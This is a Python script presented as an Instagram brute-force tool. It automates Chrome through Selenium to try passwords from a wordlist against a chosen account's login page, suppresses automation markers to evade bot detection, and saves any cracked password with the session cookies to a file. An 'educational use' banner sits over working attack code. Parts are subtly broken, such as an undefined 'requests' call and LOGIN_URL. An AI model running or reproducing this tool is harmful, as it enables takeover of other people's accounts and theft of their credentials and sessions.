##voidBear404## TOOLKIT
import threading
import queue
import time
import os
import sys
import json
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from colorama import init, Fore, Style

init(autoreset=True)

# ==================== BANNER ====================
BANNER = f"""
╔══════════════════════════════════════════════════════════╗
║   {Fore.BLUE}██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗       
║   {Fore.BLUE}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝      
║   {Fore.BLUE}██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗     
║   {Fore.BLUE}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║     
║   {Fore.BLUE}██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝      
║   {Fore.BLUE}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝       
║                                                                             
║      Instagram_Brute_Force_Tool_by_voidbaer404                   
║      For Educational Use Only                      
╚══════════════════════════════════════════════════════════╝
"""

class BruteForceInstagram:
    def __init__(self):
        self.target_url = "https://www.instagram.com/accounts/login/"
        STATUS = requests.get(LOGIN_URL).status_code
        self.username = ""
        self.password_file = ""
        self.passwords = []
        self.password_queue = queue.Queue()
        self.found_flag = threading.Event()
        self.lock = threading.Lock()
        self.tested_count = 0
        self.NUM_BROWSERS = 2
        self.found_password = None
        self.active_drivers = []
        self.error_text = "The login information you entered is incorrect."
        self.cookies_file = ""  
        self.PAGE_LOAD_TIMEOUT = 10
        self.LOGIN_RESULT_TIMEOUT = 5
        self.username_field_name = "email"
        self.password_field_name = "pass"

    def get_inputs(self):
        self.username = input("Enter Instagram username: ").strip()
        self.password_file = input("Enter password list file path: ").strip()
        
        #self.username_field_name = input('Enter the "name" attribute of username field: ').strip()
        #if not self.username_field_name:
         #   self.username_field_name = "username"
        #self.password_field_name = input('Enter the "name" attribute of password field: ').strip()
        #if not self.password_field_name:
         #   self.password_field_name = "password"
         
        if not os.path.exists(self.password_file):
            sys.exit(1)

        browsers = input(f"Number of browsers: ").strip()
        if browsers:
            self.NUM_BROWSERS = max(1, int(browsers))
            
        #custom_error = input("Enter error message text (or press Enter for default Instagram message): ").strip()
       #if custom_error:
            #self.error_text = custom_error

        
        self.cookies_file = f"cookies_{self.username}.json"

    def load_passwords(self):
        with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
            self.passwords = [line.strip() for line in f if line.strip()]
        if not self.passwords:
            
            sys.exit(1)
        for pwd in self.passwords:
            self.password_queue.put(pwd)
        
        
    def create_driver(self, browser_id):
        options = Options()
        # options.add_argument('--headless') 
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument(f'--window-size=450,800')
        options.add_argument(f'--window-position={ (browser_id-1) * 460 }, 30')

        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        with self.lock:
            self.active_drivers.append(driver)
        return driver

    def type_fast(self, element, text):
        element.clear()
        element.send_keys(text)

    def check_login_result(self, driver, original_url):
        try:
            wait = WebDriverWait(driver, self.LOGIN_RESULT_TIMEOUT)
            result = wait.until(
                EC.any_of(
                    EC.presence_of_element_located((By.XPATH, f"//*[contains(text(), '{self.error_text}')]")),
                    EC.url_changes(original_url)
                )
            )
            if isinstance(result, bool):
                return True   
            else:
                return False  
        except Exception:
            return False

    def save_cookies(self, driver, password):
        try:
            cookies = driver.get_cookies()
            session_data = {
                "username": self.username,
                "password": password,
                "timestamp": datetime.now().isoformat(),
                "cookies": cookies,
                "user_agent": driver.execute_script("return navigator.userAgent;")
            }
            with open(self.cookies_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=4, ensure_ascii=False)

        except Exception:

            pass

    def try_password(self, driver, password):
        try:
            driver.get(self.target_url)
            original_url = driver.current_url

            wait = WebDriverWait(driver, self.PAGE_LOAD_TIMEOUT)

            try:
                username_field = wait.until(EC.presence_of_element_located((By.NAME, self.username_field_name)))
            except:
                return False
            try:
                password_field = driver.find_element(By.NAME, self.password_field_name)
            except:
                return False

            self.type_fast(username_field, self.username)
            self.type_fast(password_field, password)

            try:
                submit_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                submit_button.click()
            except:
                password_field.send_keys(Keys.ENTER)

            success = self.check_login_result(driver, original_url)
            return success

        except Exception as e:
            #print(')
            return False

    def browser_worker(self, browser_id):
        driver = None
        try:
            driver = self.create_driver(browser_id)

            while not self.found_flag.is_set():
                try:
                    password = self.password_queue.get(timeout=1)
                except queue.Empty:
                    break

                with self.lock:
                    self.tested_count += 1

                success = self.try_password(driver, password)

                if success:
                    with self.lock:
                        self.found_password = password
                    # الطباعة الوحيدة عند النجاح
                    print(Fore.GREEN + f"[+] Trying User: {Fore.YELLOW}{self.username} {Fore.GREEN}| Password: {Fore.YELLOW}{password} {Fore.GREEN} SUCCESS [S_code:{STATUS}]")
                    self.save_cookies(driver, password)
                    self.found_flag.set()
                    break
                else:
                    print(Fore.RED + f"[-] Trying User: {Fore.YELLOW}{self.username} {Fore.RED}| Password: {Fore.YELLOW}{password} {Fore.RED} FAILED [S_code:{STATUS}]")

                self.password_queue.task_done()
        except Exception as e:
            print(Fore.RED + f"Error in browser {browser_id}: {e}")
        finally:
            if driver:
                try:
                    driver.quit()
                    with self.lock:
                        if driver in self.active_drivers:
                            self.active_drivers.remove(driver)
                except:
                    pass

    def run(self):
        self.get_inputs()
        self.load_passwords()

        start_time = time.time()

        threads = []
        for i in range(1, self.NUM_BROWSERS + 1):
            t = threading.Thread(target=self.browser_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            while not self.found_flag.is_set() and not self.password_queue.empty():
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Interrupted by user")
            self.found_flag.set()

        # إغلاق جميع المتصفحات
        with self.lock:
            for driver in self.active_drivers[:]:
                try:
                    driver.quit()
                except:
                    pass
            self.active_drivers.clear()

        for t in threads:
            t.join(timeout=2)

        elapsed = time.time() - start_time
        if self.found_password:

            print(Fore.GREEN + f"\n Success! Password: {self.found_password} (tested {self.tested_count} passwords in {elapsed:.0f}s)")
        else:
            print(Fore.RED + f"\n No password found after {self.tested_count} attempts in {elapsed:.0f}s")

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    BruteForceInstagram().run()
